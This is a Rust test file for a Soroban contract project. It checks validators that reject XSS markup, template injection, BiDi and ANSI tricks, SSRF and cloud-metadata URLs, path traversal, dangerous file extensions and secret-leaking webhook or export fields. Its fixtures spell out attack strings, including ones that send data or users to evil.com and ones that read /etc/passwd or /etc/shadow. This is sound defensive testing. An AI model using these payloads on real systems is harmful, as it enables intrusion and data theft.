//! Unit and integration tests for sensitive-content boundary defenses.
//!
//! Verifies:
//! - Rendering boundary: XSS, dangerous HTML/SVG tags, event handlers, template injection,
//!   BiDi spoofing, ANSI escapes, null-byte termination.
//! - Downloads boundary: scheme allow-lists, dangerous schemes, SSRF / cloud-metadata / loopback
//!   rejections, path traversal, null-byte poisoning, executable extensions.
//! - Webhooks boundary: HTTPS destination enforcement, SSRF prevention, replay windows,
//!   executable markup rejection, and private field leakage prevention.
//! - Exports boundary across Treasury, Aid, Referral, Governance, Oracle, and Marketplace:
//!   allow-list enforcement, forbidden secret purging, scope isolation, and chunk ceilings.
//! - Operational edge cases and failure modes.

#![cfg(test)]

extern crate std;

use soroban_sdk::{
    symbol_short,
    testutils::Address as _,
    Address, Bytes, Env, String, Symbol, Vec,
};

use crate::export::{ExportField, ExportRecord, ExportScope, RecordSensitivity};
use crate::sensitive_boundary::{
    assert_no_forbidden_fields, assert_webhook_payload_clean, contains_bidi_controls,
    contains_executable_markup, contains_path_traversal, contains_template_injection,
    enforce_export_scope_boundary, has_allowlisted_download_extension,
    has_dangerous_download_extension, is_export_allowlisted_field, is_forbidden_export_field,
    is_forbidden_ssrf_destination, sanitize_export_record, sanitize_render_content,
    validate_download_filename, validate_download_uri, validate_export_chunk_size,
    validate_render_content, validate_webhook_destination, verify_webhook_ingress_boundary,
    BoundaryModule, DownloadScheme, SensitiveBoundaryError, MAX_DOWNLOAD_URI_LEN,
    MAX_FILENAME_LEN, MAX_RENDER_TEXT_LEN,
};
use crate::webhook::{WebhookConfig, WebhookEvent};

fn make_field(env: &Env, name: Symbol, value: &str) -> ExportField {
    ExportField {
        name,
        value: String::from_str(env, value),
    }
}

// ---------------------------------------------------------------------------
// 1. Rendering Boundary Tests
// ---------------------------------------------------------------------------

#[test]
fn test_rendering_blocks_xss_script_tags() {
    let env = Env::default();
    let attacks: &[&[u8]] = &[
        b"<script>alert('pwned')</script>",
        b"<SCRIPT SRC='https://evil.org/xss.js'></SCRIPT>",
        b"Hello <ScRiPt>document.location='http://evil.com'</sCrIpt> World",
        b"<script/x>alert(1)</script>",
    ];
    for &attack in attacks {
        let b = Bytes::from_slice(&env, attack);
        assert!(contains_executable_markup(&b));
        assert_eq!(
            validate_render_content(&b, MAX_RENDER_TEXT_LEN, true),
            Err(SensitiveBoundaryError::ExecutableContentRejected)
        );
    }
}

#[test]
fn test_rendering_blocks_dangerous_markup_and_svg_tags() {
    let env = Env::default();
    let dangerous_tags: &[&[u8]] = &[
        b"<iframe src='javascript:alert(1)'></iframe>",
        b"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
        b"<embed src='evil.swf'></embed>",
        b"<form action='https://evil.com/steal'><input type='submit'></form>",
        b"<svg onload=alert(document.cookie)>",
        b"<link rel='stylesheet' href='http://evil.com/leak.css'>",
        b"<style>body{display:none;}</style>",
        b"<meta http-equiv='refresh' content='0;url=http://evil.com'>",
        b"<base href='http://evil.com/'>",
        b"<applet code='Evil.class'></applet>",
        b"<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>",
        b"<template><script>alert(1)</script></template>",
    ];
    for &tag in dangerous_tags {
        let b = Bytes::from_slice(&env, tag);
        assert!(
            contains_executable_markup(&b),
            "Tag {:?} must be classified as executable markup",
            std::str::from_utf8(tag).unwrap_or("?")
        );
        assert_eq!(
            validate_render_content(&b, MAX_RENDER_TEXT_LEN, true),
            Err(SensitiveBoundaryError::ExecutableContentRejected)
        );
    }
}

#[test]
fn test_rendering_blocks_event_handlers_and_pseudo_protocols() {
    let env = Env::default();
    let handlers: &[&[u8]] = &[
        b"<img src=x onerror=alert(1)>",
        b"<a href='javascript:alert(1)'>click me</a>",
        b"<body onload=steal()>",
        b"<input type='text' onfocus='malicious()'>",
        b"<div onmouseover='exploit()'>hover</div>",
        b"<button onclick='drain()'>Claim</button>",
        b"<a href='vbscript:msgbox(1)'>VBS</a>",
        b"<a href='data:text/html,<script>alert(1)</script>'>Data HTML</a>",
    ];
    for &h in handlers {
        let b = Bytes::from_slice(&env, h);
        assert_eq!(
            validate_render_content(&b, MAX_RENDER_TEXT_LEN, true),
            Err(SensitiveBoundaryError::ExecutableContentRejected)
        );
    }
}

#[test]
fn test_rendering_blocks_template_injection() {
    let env = Env::default();
    let template_attacks: &[&[u8]] = &[
        b"Proposal: {{7*7}} result",
        b"Beneficiary: ${process.env.SECRET_KEY}",
        b"Category: <%= File.read('/etc/passwd') %>",
        b"Memo: #{1337+1}",
    ];
    for &t in template_attacks {
        let b = Bytes::from_slice(&env, t);
        assert!(contains_template_injection(&b));
        assert_eq!(
            validate_render_content(&b, MAX_RENDER_TEXT_LEN, true),
            Err(SensitiveBoundaryError::ExecutableContentRejected)
        );
    }
}

#[test]
fn test_rendering_blocks_bidi_text_spoofing() {
    let env = Env::default();
    // U+202E Right-to-Left Override: [0xE2, 0x80, 0xAE]
    let rlo = [0x41, 0x42, 0xE2, 0x80, 0xAE, 0x43, 0x44];
    let b_rlo = Bytes::from_slice(&env, &rlo);
    assert!(contains_bidi_controls(&b_rlo));
    assert_eq!(
        validate_render_content(&b_rlo, MAX_RENDER_TEXT_LEN, true),
        Err(SensitiveBoundaryError::SandboxEscapeAttempt)
    );

    // U+202D Left-to-Right Override: [0xE2, 0x80, 0xAD]
    let lro = [0xE2, 0x80, 0xAD, 0x30, 0x31];
    let b_lro = Bytes::from_slice(&env, &lro);
    assert!(contains_bidi_controls(&b_lro));
    assert_eq!(
        validate_render_content(&b_lro, MAX_RENDER_TEXT_LEN, true),
        Err(SensitiveBoundaryError::SandboxEscapeAttempt)
    );

    // U+2066 Left-to-Right Isolate: [0xE2, 0x81, 0xA6]
    let lri = [0xE2, 0x81, 0xA6, 0x61, 0x62];
    let b_lri = Bytes::from_slice(&env, &lri);
    assert!(contains_bidi_controls(&b_lri));
    assert_eq!(
        validate_render_content(&b_lri, MAX_RENDER_TEXT_LEN, true),
        Err(SensitiveBoundaryError::SandboxEscapeAttempt)
    );
}

#[test]
fn test_rendering_blocks_ansi_escapes_and_null_bytes() {
    let env = Env::default();
    // Null byte
    let null_attack = b"Valid description\0<script>evil()</script>";
    let b_null = Bytes::from_slice(&env, null_attack);
    assert_eq!(
        validate_render_content(&b_null, MAX_RENDER_TEXT_LEN, true),
        Err(SensitiveBoundaryError::ExecutableContentRejected)
    );

    // ANSI escape code (0x1B)
    let ansi_attack = [0x1B, b'[', b'2', b'J', b'C', b'l', b'e', b'a', b'r'];
    let b_ansi = Bytes::from_slice(&env, &ansi_attack);
    assert_eq!(
        validate_render_content(&b_ansi, MAX_RENDER_TEXT_LEN, true),
        Err(SensitiveBoundaryError::SandboxEscapeAttempt)
    );
}

#[test]
fn test_rendering_allows_clean_safe_content() {
    let env = Env::default();
    let safe_single = Bytes::from_slice(&env, b"Humanitarian aid disbursement for drought response.");
    assert_eq!(
        validate_render_content(&safe_single, MAX_RENDER_TEXT_LEN, false),
        Ok(())
    );

    let safe_multi = Bytes::from_slice(&env, b"Line 1: Treasury review\nLine 2: 5000 USDC transfer\nLine 3: Verified");
    assert_eq!(
        validate_render_content(&safe_multi, MAX_RENDER_TEXT_LEN, true),
        Ok(())
    );
    // Multiline rejected when multiline is false
    assert_eq!(
        validate_render_content(&safe_multi, MAX_RENDER_TEXT_LEN, false),
        Err(SensitiveBoundaryError::ExecutableContentRejected)
    );

    // Sanitization trims whitespace cleanly
    let padded = Bytes::from_slice(&env, b"   Valid marketplace NFT description   \n");
    let sanitized = sanitize_render_content(&env, &padded, MAX_RENDER_TEXT_LEN, true).unwrap();
    assert_eq!(sanitized, Bytes::from_slice(&env, b"Valid marketplace NFT description"));
}

#[test]
fn test_rendering_enforces_maximum_length_bounds() {
    let env = Env::default();
    let empty = Bytes::new(&env);
    assert_eq!(
        validate_render_content(&empty, 100, true),
        Err(SensitiveBoundaryError::BoundaryLimitExceeded)
    );

    let mut oversized = Bytes::new(&env);
    for _ in 0..101 {
        oversized.push_back(b'a');
    }
    assert_eq!(
        validate_render_content(&oversized, 100, true),
        Err(SensitiveBoundaryError::BoundaryLimitExceeded)
    );
}

// ---------------------------------------------------------------------------
// 2. Downloads Boundary Tests
// ---------------------------------------------------------------------------

#[test]
fn test_download_accepts_allowlisted_schemes() {
    let env = Env::default();
    // HTTPS
    let https = Bytes::from_slice(&env, b"https://trellis.network/contracts/v1/spec.json");
    assert_eq!(
        validate_download_uri(&https, MAX_DOWNLOAD_URI_LEN),
        Ok(DownloadScheme::Https)
    );

    // IPFS
    let ipfs = Bytes::from_slice(&env, b"ipfs://bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi");
    assert_eq!(
        validate_download_uri(&ipfs, MAX_DOWNLOAD_URI_LEN),
        Ok(DownloadScheme::Ipfs)
    );

    // IPNS
    let ipns = Bytes::from_slice(&env, b"ipns://k51qzi5uqu5dl11xvi25278m0q36b75eakpwhc1809072r2pndv3q538wz1p3w");
    assert_eq!(
        validate_download_uri(&ipns, MAX_DOWNLOAD_URI_LEN),
        Ok(DownloadScheme::Ipns)
    );

    // Arweave
    let ar = Bytes::from_slice(&env, b"ar://aB1c2D3e4F5g6H7i8J9k0L1m2N3o4P5q6R7s8T9u0V1");
    assert_eq!(
        validate_download_uri(&ar, MAX_DOWNLOAD_URI_LEN),
        Ok(DownloadScheme::Arweave)
    );

    // DID
    let did = Bytes::from_slice(&env, b"did:pkh:stellar:GABC1234567890");
    assert_eq!(
        validate_download_uri(&did, MAX_DOWNLOAD_URI_LEN),
        Ok(DownloadScheme::Did)
    );
}

#[test]
fn test_download_rejects_dangerous_and_unauthorized_schemes() {
    let env = Env::default();
    let dangerous_schemes: &[&[u8]] = &[
        b"javascript:alert(1)",
        b"JAVASCRIPT:alert(document.cookie)",
        b"data:application/json,{\"secret\":\"leak\"}",
        b"file:///etc/shadow",
        b"FILE://localhost/c$/boot.ini",
        b"blob:https://trellis.network/uuid",
        b"vbscript:msgbox(\"hack\")",
        b"about:blank",
        b"chrome://settings",
        b"view-source:https://google.com",
        b"ftp://ftp.evil.com/payload.exe",
    ];
    for &uri in dangerous_schemes {
        let b = Bytes::from_slice(&env, uri);
        assert!(
            validate_download_uri(&b, MAX_DOWNLOAD_URI_LEN).is_err(),
            "Scheme {:?} must be rejected",
            std::str::from_utf8(uri).unwrap_or("?")
        );
    }
}

#[test]
fn test_download_blocks_ssrf_and_cloud_metadata() {
    let env = Env::default();
    let ssrf_targets: &[&[u8]] = &[
        b"https://localhost/admin/keys",
        b"https://127.0.0.1:8080/internal",
        b"https://[::1]/debug",
        b"https://169.254.169.254/latest/meta-data/",
        b"https://169.254.169.254/computeMetadata/v1/",
        b"https://metadata.google.internal/computeMetadata/v1/",
        b"https://10.0.0.5/secrets",
        b"https://192.168.1.100/router",
        b"https://172.16.0.1/private",
        b"https://172.31.255.255/internal",
        b"https://0.0.0.0:3000/export",
    ];
    for &target in ssrf_targets {
        let b = Bytes::from_slice(&env, target);
        assert!(is_forbidden_ssrf_destination(&b));
        assert_eq!(
            validate_download_uri(&b, MAX_DOWNLOAD_URI_LEN),
            Err(SensitiveBoundaryError::UnsafeDownloadDestination)
        );
    }
}

#[test]
fn test_download_filename_blocks_path_traversal() {
    let env = Env::default();
    let traversal_filenames: &[&[u8]] = &[
        b"../../etc/passwd.json",
        b"..\\..\\windows\\system32\\calc.exe",
        b"downloads/../../sensitive_export.csv",
        b"report%2e%2e/leak.txt",
        b"..%2f..%2froot.pdf",
        b"..%5c..%5cconfig.json",
        b"/../secret.json",
        b"\\..\\secret.json",
    ];
    for &fname in traversal_filenames {
        let b = Bytes::from_slice(&env, fname);
        assert!(contains_path_traversal(&b));
        assert_eq!(
            validate_download_filename(&b),
            Err(SensitiveBoundaryError::SandboxEscapeAttempt)
        );
    }
}

#[test]
fn test_download_filename_blocks_null_byte_poisoning() {
    let env = Env::default();
    let poisoned = b"report.pdf\0.exe";
    let b = Bytes::from_slice(&env, poisoned);
    assert_eq!(
        validate_download_filename(&b),
        Err(SensitiveBoundaryError::SandboxEscapeAttempt)
    );
}

#[test]
fn test_download_filename_blocks_dangerous_extensions() {
    let env = Env::default();
    let dangerous_exts: &[&[u8]] = &[
        b"payload.exe",
        b"script.bat",
        b"run.cmd",
        b"installer.sh",
        b"exploit.ps1",
        b"macro.vbs",
        b"bytecode.wasm",
        b"malware.jar",
        b"setup.msi",
        b"driver.dll",
        b"library.so",
        b"phishing.html",
        b"phishing.htm",
        b"client.js",
        b"module.mjs",
        b"payload.xhtml",
        b"trojan.scr",
    ];
    for &f in dangerous_exts {
        let b = Bytes::from_slice(&env, f);
        assert!(has_dangerous_download_extension(&b));
        assert_eq!(
            validate_download_filename(&b),
            Err(SensitiveBoundaryError::ExecutableContentRejected)
        );
    }
}

#[test]
fn test_download_filename_accepts_allowlisted_extensions() {
    let env = Env::default();
    let valid_files: &[&[u8]] = &[
        b"treasury_report_2026.json",
        b"aid_disbursements.csv",
        b"audit_evidence_summary.txt",
        b"governance_spec_v1.pdf",
        b"nft_artwork.png",
        b"nft_thumbnail.jpg",
        b"contract_badge.svg",
        b"banner_image.webp",
    ];
    for &f in valid_files {
        let b = Bytes::from_slice(&env, f);
        assert!(has_allowlisted_download_extension(&b));
        assert_eq!(validate_download_filename(&b), Ok(()));
    }
}

// ---------------------------------------------------------------------------
// 3. Webhook Boundary Tests
// ---------------------------------------------------------------------------

#[test]
fn test_webhook_destination_blocks_insecure_and_ssrf() {
    let env = Env::default();
    // HTTP rejected
    let http = Bytes::from_slice(&env, b"http://api.trellis.org/webhook");
    assert_eq!(
        validate_webhook_destination(&http),
        Err(SensitiveBoundaryError::UnsafeDownloadDestination)
    );

    // SSRF Loopback rejected
    let loopback = Bytes::from_slice(&env, b"https://127.0.0.1:9000/webhook");
    assert_eq!(
        validate_webhook_destination(&loopback),
        Err(SensitiveBoundaryError::UnsafeDownloadDestination)
    );

    // SSRF Metadata rejected
    let meta = Bytes::from_slice(&env, b"https://169.254.169.254/webhook");
    assert_eq!(
        validate_webhook_destination(&meta),
        Err(SensitiveBoundaryError::UnsafeDownloadDestination)
    );

    // Valid external HTTPS webhook accepted
    let valid = Bytes::from_slice(&env, b"https://webhooks.integrator.com/trellis/events");
    assert_eq!(validate_webhook_destination(&valid), Ok(()));
}

#[test]
fn test_webhook_payload_blocks_private_key_leakage() {
    let env = Env::default();
    let leaking_payloads: &[&[u8]] = &[
        b"{\"event\":\"settled\",\"priv_key\":\"SCZANGBA5YHTNYVS3ZSXQ7\"}",
        b"{\"seed\":\"SECRET_SEED_DATA\",\"amount\":1000}",
        b"{\"token_sec\":\"bearer-token-123\",\"status\":\"ok\"}",
        b"{\"auth_sig\":\"ed25519-sig-data\",\"user\":\"alice\"}",
        b"{\"password\":\"admin_pass\",\"role\":\"Admin\"}",
        b"{\"ssn\":\"000-11-2222\",\"recipient\":\"bob\"}",
        b"{\"bank_wire\":\"US9900112233\",\"wire_id\":\"123\"}",
        b"{\"card_num\":\"4111111111111111\",\"payer\":\"carol\"}",
        b"{\"admin_key\":\"MASTER_KEY_SECRET\"}",
        b"{\"res_seed\":\"0xdeadbeef1234\"}",
        b"{\"ballot_slt\":\"voter_secret_salt\"}",
    ];
    for &leak in leaking_payloads {
        let b = Bytes::from_slice(&env, leak);
        assert_eq!(
            assert_webhook_payload_clean(&b),
            Err(SensitiveBoundaryError::PrivateFieldLeakage)
        );
    }

    // Clean payload accepted
    let clean = Bytes::from_slice(&env, b"{\"event\":\"aid_disbursed\",\"aid_id\":\"AID_100\",\"amount\":5000}");
    assert_eq!(assert_webhook_payload_clean(&clean), Ok(()));
}

#[test]
fn test_webhook_ingress_blocks_executable_markup() {
    let env = Env::default();
    let event = WebhookEvent {
        event_id: soroban_sdk::BytesN::from_array(&env, &[1u8; 32]),
        timestamp: 1000,
        payload: Bytes::from_slice(&env, b"{\"memo\":\"<script>alert('hook')</script>\"}"),
    };
    let config = WebhookConfig::default();
    assert_eq!(
        verify_webhook_ingress_boundary(&event, &config, 1000),
        Err(SensitiveBoundaryError::ExecutableContentRejected)
    );
}

#[test]
fn test_webhook_ingress_enforces_replay_and_future_window() {
    let env = Env::default();
    let clean_payload = Bytes::from_slice(&env, b"{\"status\":\"ok\"}");
    let config = WebhookConfig {
        replay_window_seconds: 300,
        max_future_skew_seconds: 60,
    };
    let current_time = 10_000u64;

    // Normal timestamp in window (9800..=10060)
    let event_ok = WebhookEvent {
        event_id: soroban_sdk::BytesN::from_array(&env, &[2u8; 32]),
        timestamp: 9900,
        payload: clean_payload.clone(),
    };
    assert_eq!(
        verify_webhook_ingress_boundary(&event_ok, &config, current_time),
        Ok(())
    );

    // Stale timestamp (older than 300s)
    let event_stale = WebhookEvent {
        event_id: soroban_sdk::BytesN::from_array(&env, &[3u8; 32]),
        timestamp: 9699,
        payload: clean_payload.clone(),
    };
    assert_eq!(
        verify_webhook_ingress_boundary(&event_stale, &config, current_time),
        Err(SensitiveBoundaryError::WebhookVerificationFailed)
    );

    // Excessive future skew (more than 60s ahead)
    let event_future = WebhookEvent {
        event_id: soroban_sdk::BytesN::from_array(&env, &[4u8; 32]),
        timestamp: 10_061,
        payload: clean_payload.clone(),
    };
    assert_eq!(
        verify_webhook_ingress_boundary(&event_future, &config, current_time),
        Err(SensitiveBoundaryError::WebhookVerificationFailed)
    );
}

// ---------------------------------------------------------------------------
// 4. Exports Boundary Tests across All 6 Core Modules
// ---------------------------------------------------------------------------

#[test]
fn test_export_allowlist_preserves_safe_fields() {
    let safe_fields = [
        symbol_short!("id"),
        symbol_short!("type"),
        symbol_short!("status"),
        symbol_short!("amount"),
        symbol_short!("created"),
        symbol_short!("expiry"),
        symbol_short!("region"),
        symbol_short!("role"),
        symbol_short!("tier"),
        symbol_short!("version"),
        symbol_short!("network"),
        symbol_short!("count"),
    ];
    for s in &safe_fields {
        assert!(is_export_allowlisted_field(s));
        assert!(!is_forbidden_export_field(s));
    }
}

#[test]
fn test_export_purges_unlisted_and_forbidden_fields() {
    let env = Env::default();
    let owner = Address::generate(&env);

    let mut fields: Vec<ExportField> = Vec::new(&env);
    // Allow-listed safe fields
    fields.push_back(make_field(&env, symbol_short!("id"), "TREASURY_001"));
    fields.push_back(make_field(&env, symbol_short!("status"), "Active"));
    fields.push_back(make_field(&env, symbol_short!("amount"), "50000"));

    // Forbidden secret fields
    fields.push_back(make_field(&env, symbol_short!("priv_key"), "SCZA..."));
    fields.push_back(make_field(&env, symbol_short!("seed"), "SEED_ENTROPY"));
    fields.push_back(make_field(&env, symbol_short!("admin_key"), "ADMIN_SECRET"));
    fields.push_back(make_field(&env, symbol_short!("tax_id"), "99-887766"));

    // Non-allow-listed arbitrary metadata fields
    fields.push_back(make_field(&env, symbol_short!("arbitrary"), "unauthorized_field"));
    fields.push_back(make_field(&env, symbol_short!("internal"), "debug_trace"));

    let record = ExportRecord {
        id: symbol_short!("rec_1"),
        record_type: symbol_short!("treasury"),
        owner: owner.clone(),
        created_ledger: 100,
        sensitivity: RecordSensitivity::Public,
        fields,
    };

    let (sanitized, purged_count) = sanitize_export_record(&env, &record);
    assert_eq!(purged_count, 6); // 4 forbidden + 2 arbitrary
    assert_eq!(sanitized.fields.len(), 3);
    assert_eq!(sanitized.fields.get(0).unwrap().name, symbol_short!("id"));
    assert_eq!(sanitized.fields.get(1).unwrap().name, symbol_short!("status"));
    assert_eq!(sanitized.fields.get(2).unwrap().name, symbol_short!("amount"));

    // Verify sanitized fields trigger no forbidden assertion
    assert_eq!(assert_no_forbidden_fields(&sanitized.fields), Ok(()));
}

#[test]
fn test_export_assert_no_forbidden_fields_detects_violations() {
    let env = Env::default();
    let mut fields: Vec<ExportField> = Vec::new(&env);
    fields.push_back(make_field(&env, symbol_short!("status"), "ok"));
    fields.push_back(make_field(&env, symbol_short!("raw_pii"), "alice@email.com"));

    assert_eq!(
        assert_no_forbidden_fields(&fields),
        Err(SensitiveBoundaryError::PrivateFieldLeakage)
    );
}

#[test]
fn test_export_scope_isolation_boundaries() {
    let env = Env::default();
    let alice = Address::generate(&env);
    let bob = Address::generate(&env);

    // OwnRecords scope:
    // - Caller is alice, record owner is alice -> OK
    assert_eq!(
        enforce_export_scope_boundary(&alice, &alice, RecordSensitivity::Public, ExportScope::OwnRecords),
        Ok(())
    );

    // - Caller is alice, record owner is bob -> REJECTED
    assert_eq!(
        enforce_export_scope_boundary(&bob, &alice, RecordSensitivity::Public, ExportScope::OwnRecords),
        Err(SensitiveBoundaryError::ScopeIsolationViolation)
    );

    // - Record is Operational / Restricted -> REJECTED under OwnRecords
    assert_eq!(
        enforce_export_scope_boundary(&alice, &alice, RecordSensitivity::Operational, ExportScope::OwnRecords),
        Err(SensitiveBoundaryError::ScopeIsolationViolation)
    );
    assert_eq!(
        enforce_export_scope_boundary(&alice, &alice, RecordSensitivity::Restricted, ExportScope::OwnRecords),
        Err(SensitiveBoundaryError::ScopeIsolationViolation)
    );

    // Operational scope:
    // - Operational data allowed
    assert_eq!(
        enforce_export_scope_boundary(&bob, &alice, RecordSensitivity::Operational, ExportScope::Operational),
        Ok(())
    );
    // - Restricted secret data blocked
    assert_eq!(
        enforce_export_scope_boundary(&bob, &alice, RecordSensitivity::Restricted, ExportScope::Operational),
        Err(SensitiveBoundaryError::ScopeIsolationViolation)
    );

    // Full scope:
    // - Admin can access restricted operational records
    assert_eq!(
        enforce_export_scope_boundary(&bob, &alice, RecordSensitivity::Restricted, ExportScope::Full),
        Ok(())
    );
}

#[test]
fn test_export_chunk_ceiling_bounds_memory() {
    // 50 is default ceiling
    assert_eq!(validate_export_chunk_size(25), Ok(()));
    assert_eq!(validate_export_chunk_size(50), Ok(()));
    assert_eq!(
        validate_export_chunk_size(51),
        Err(SensitiveBoundaryError::BoundaryLimitExceeded)
    );
    assert_eq!(
        validate_export_chunk_size(100),
        Err(SensitiveBoundaryError::BoundaryLimitExceeded)
    );
}

// ---------------------------------------------------------------------------
// 5. Multi-Module Vertical Slice Integration Verification
// (Treasury, Aid, Referral, Governance, Oracle, Marketplace)
// ---------------------------------------------------------------------------

#[test]
fn test_all_modules_enforce_sensitive_boundaries() {
    let env = Env::default();
    let caller = Address::generate(&env);

    let modules = [
        BoundaryModule::Treasury,
        BoundaryModule::Aid,
        BoundaryModule::Referral,
        BoundaryModule::Governance,
        BoundaryModule::Oracle,
        BoundaryModule::Marketplace,
    ];

    for module in modules {
        // 1. Rendering Boundary: untrusted input for each module
        let bad_memo = Bytes::from_slice(&env, b"<svg onload=alert('module_escape')>");
        assert_eq!(
            validate_render_content(&bad_memo, MAX_RENDER_TEXT_LEN, false),
            Err(SensitiveBoundaryError::ExecutableContentRejected),
            "Module {:?} must reject executable memo",
            module
        );

        // 2. Download Boundary: untrusted attachment URI
        let bad_uri = Bytes::from_slice(&env, b"https://localhost:8080/asset.pdf");
        assert_eq!(
            validate_download_uri(&bad_uri, MAX_DOWNLOAD_URI_LEN),
            Err(SensitiveBoundaryError::UnsafeDownloadDestination),
            "Module {:?} must reject SSRF attachment URI",
            module
        );

        // 3. Download Boundary: path traversal attachment
        let bad_fname = Bytes::from_slice(&env, b"../../system/secret.json");
        assert_eq!(
            validate_download_filename(&bad_fname),
            Err(SensitiveBoundaryError::SandboxEscapeAttempt),
            "Module {:?} must reject path traversal file",
            module
        );

        // 4. Webhook Boundary: payload leaking secret
        let bad_hook_payload = Bytes::from_slice(&env, b"{\"sec_key\":\"LEAKED\"}");
        assert_eq!(
            assert_webhook_payload_clean(&bad_hook_payload),
            Err(SensitiveBoundaryError::PrivateFieldLeakage),
            "Module {:?} must reject leaking webhook payload",
            module
        );

        // 5. Export Boundary: record with forbidden fields sanitized
        let mut fields: Vec<ExportField> = Vec::new(&env);
        fields.push_back(make_field(&env, symbol_short!("id"), "ID_001"));
        fields.push_back(make_field(&env, symbol_short!("priv_key"), "RAW_KEY"));

        let rec = ExportRecord {
            id: symbol_short!("m_rec"),
            record_type: symbol_short!("mod"),
            owner: caller.clone(),
            created_ledger: 10,
            sensitivity: RecordSensitivity::Public,
            fields,
        };

        let (sanitized, purged) = sanitize_export_record(&env, &rec);
        assert_eq!(purged, 1, "Module {:?} must purge forbidden priv_key", module);
        assert_eq!(sanitized.fields.len(), 1);
        assert_eq!(sanitized.fields.get(0).unwrap().name, symbol_short!("id"));
    }
}
